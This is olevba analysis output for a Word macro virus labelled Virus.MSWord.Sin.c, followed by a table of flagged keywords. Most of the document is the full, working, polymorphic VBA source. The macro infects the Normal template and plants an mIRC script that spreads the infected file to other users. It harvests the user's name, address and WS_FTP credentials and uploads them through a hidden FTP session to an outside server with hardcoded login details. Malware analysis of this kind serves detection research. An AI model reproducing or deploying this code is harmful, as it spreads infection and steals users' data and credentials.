olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sin.c-1f6651c63c0c26cd194d0862cfef8628d4b785d2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sin.c-1f6651c63c0c26cd194d0862cfef8628d4b785d2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
YYWWPSWHH:  Options.SaveNormalPrompt = False
JJJ = IIIIII
ITNKTOUQ:  Randomize Timer
XMDHYQ:  LordArz = "Technological Illusions"
BPYQKJMWSQE:  NormInstalled = False
VVVVVV = x
YAJXWRAI:  ActInstalled = False
W = MMM
YOFOMA:  Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
BYRUQMGBF:  Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
RRR = N
GWCPJWBBFEF:
JJJJ = FFFFF
OINFKJCWMAV:  NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
UDHNTQVMYVU:  AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
IWPPQAHNH:
QAWLEHBI:  If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True
G = CCCCC
LAKLHU:  If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True
KLXDFWDXVBN:
XASMLALM:  If NormInstalled = False Then
XCTMJCVFNB:      Set Infection = NormCarrier
EWGVMYMCYB:      Set Carrier = ActCarrier
GAPGPMV:  Else
PYJENBU:      Set Infection = ActCarrier
CKINCJAKCO:      Set Carrier = NormCarrier
NPVNCT:  End If
IIYYYFICF:
HLWELFGMEBB:
FPOXFSPFNR:
ADKECT:  DoEvents
OOOOO = DDD
JGBCRS:
NAMCEHNSDY:  Close
IIXENLAVSB:  Tr1 = Dir(CurDir & "\script.ini", vbNormal)
JJJJJJ = PPPPPP
ITPIGL:  Tr2 = UCase(Right(CurDir, 8))
HPJQYTKCIYK:  Tr3 = Dir("C" & Chr(58) & "\MIRC", vbDirectory)
MHREBSG:
HDFHOX:  If Tr1 <> "" Then SDir = CurDir & "\script.ini"
ULWVSHVVJ:  If Tr2 = "DOWNLOAD" Then SDir = CurDir & "\..\Script.ini"
FF = MMM
OVBFOL:  If Tr3 <> "" Then SDir = "C" & Chr(58) & "\MIRC\Script.ini"
GBBPMT:
x = LLL
EDCMTYX:  If SDir <> "" Then
MPRHPW:      Open SDir For Output As #1
KFGCYUVMTV:      Print #1, "n0=on 1" & Chr(59) & "JOIN" & Chr(59) & "#" & Chr(59) & "if ( $me != $nick ) { /dcc send $nick " & ThisDocument.FullName & " }"
EVMRCLSF:      Close #1
RYCHYHS:  End If
RGPLIC:
LDXVKH:  DoEvents
PETHVE:
WWWWWW = XXXXXX
IDNPPKFJNK:  WinPath = Environ("WINDIR")
OJRIUSNGCVL:
VLDYEWQX:  If Application.Tasks.Exists("Sockets Window") = True And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = "" Or System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = WeekDay(Date) Then
UU = MMMMM
ULXYEXAM:      With Application.FileSearch
O = GGGG
RXQIHBQ:              .FileName = "WS_FTP.ini"
QOWBXYAYMO:              .LookIn = "C" & Chr(58) & "\"
ALTNSJBUSK:              .SearchSubFolders = True
OYLMNSK:              .MatchTextExactly = True
GGGG = PPPPP
KTKAKVWKXE:              .FileType = msoFileTypeAllFiles
MGMTYIYUTKN:              .Execute
BBBBB = YYY
FQHKCJIDS:              WsPath = .FoundFiles(1)
XIOGBK:      End With
GMLBVUKUUN:
CXESGEHV:      DoEvents
EWSKDIUDGJM:
RYIFKIA:      If ActiveDocument.HasPassword = True Then BCK = True
TOEWFEU:
XX = TTT
ORMPCKSYA:      DoEvents
W = VVVV
OPKUITSQO:      Open WinPath & "\" & Application.UserInitials & ".dat" For Output As #10
CIQAPSXW:      Print #10, Application.UserName
YDPAQTU:      Print #10, Application.UserAddress
MBTNCOOF:      If BCK = True Then Print #10, ActiveDocument.FullName
OOOOOO = OOO
IPDHNREQH:      If WsPath <> "" Then Print #10, "WS_FTP"
AVCOCJGC:      Close #10
WW = YYYY
NPQOCWA:      Open WinPath & "\Command.$$$" For Output As #8
SUGYDMTAK:      Print #8, "o ftp.xoom.com"
LUKLVRBGWP:      Print #8, "User SingOfScream"
JARUGWP:      Print #8, "DIG001"
UYEXGAKMYVD:      Print #8, "binary"
EEEEEE = VVVV
HCPNDFK:      Print #8, "put " & WinPath & "\" & Application.UserInitials & ".dat"
OCCVEQMTNSC:      If WsPath <> "" Then Print #8, "put " & WsPath
MGCDQPTHWAO:      If BCK = True Then Print #8, "put " & ActiveDocument.FullName
XTYHUKD:          Print #8, "quit"
EYGSBQ:      Close
VDRGLBU:      Shell WinPath & "\command.com /c FTP.exe -n -s:" & WinPath & "\Command.$$$", vbHide
OQUUKBIPI:      System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = WeekDay(Date)
XTLGWRJ:  End If
TNBXURAUFN:
DUSWKA:  For x = 1 To ThisDocument.Variables.Count
AGOJTG:      ThisDocument.Variables(x).Delete
CRCSGUFJ:  Next x
MCWAQQU:  For x = 1 To Normal.ThisDocument.Variables.Count
TTTTTT = KKK
OWQPRKJ:      Normal.ThisDocument.Variables(x).Delete
XWHXHOFN:  Next x
VFJILQHVDIO:
MQMLUAYTVAO:  With Carrier
FYOVMIA:      UECode = .Lines(1, 2) & Chr(13)
RKNLBPLHYQH:      For x = 5 To .CountOfLines - 1
FOUEJLEL:          VCCode = .Lines(x, 1)
HHHH = V
VGBMTHARAG:          If VCCode = "End Sub" Then Exit For
ULCIDG:          For i = 1 To 20
CCCCCC = WW
CDFYUFNNP:              If Mid(VCCode, i, 1) = ":" Then VCCode = Right(VCCode, Len(VCCode) - i)
MHFUNTCLBKY:          Next i
JMIUDC:          factor = ""
PPPP = KKK
BLFSNC:          For Y = 1 To Int(Rnd * 6) + 6
SSSSSS = IIII
MHUIJQBU:              factor = factor & Chr(Int(Rnd * 25) + 65)
UBGCUTMQLA:          Next Y
JRKISSITCWA:          make_morph = factor & ": "
UXQQBTVHP:
HROTJOTT:          VirCode = VirCode & make_morph & " " & VCCode & Chr(13)
YQOTKRQGBE:          If Int(Rnd * 10) > 7 Then VirCode = VirCode & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & " = " & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & Chr(13)
LEAEMITK:      Next x
UTNIERVEHNB:      VirCode = UECode & VirCode & "End Sub"
AHPNWKFD:  End With
ISOQWHH:
WIFAWHT:  Normal.ThisDocument.Variables.Add "VCode", VirCode
GLEJHE:
GVECOJG:  ResetMe = "Private Sub Document_Close()" & Chr(13)
XEWFWCCVKL:  ResetMe = ResetMe & String(150, Chr(9)) & "With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save" & Chr(13)
UJNIWRJ:  ResetMe = ResetMe & "End Sub"
YHSFSMYI:
WFVOBMW:  With ActCarrier
WWWW = GG
HKDGEXNRF:          .DeleteLines 1, .CountOfLines
SGOKBIE:          .InsertLines 1, ResetMe
FNKSURYFK:  End With
YKRKIBMUQWD:
SHWUQLLFSX:  With NormCarrier
FRRWTW:      .DeleteLines 1, .CountOfLines
NHWBJDHG:      .InsertLines 1, ResetMe
DXKNXCP:  End With
DNQQFVBQDS:
AAAA = JJJJJJ
UWKAMB:  ActiveDocument.Save
YDBOVL:  NormalTemplate.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |FTP.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

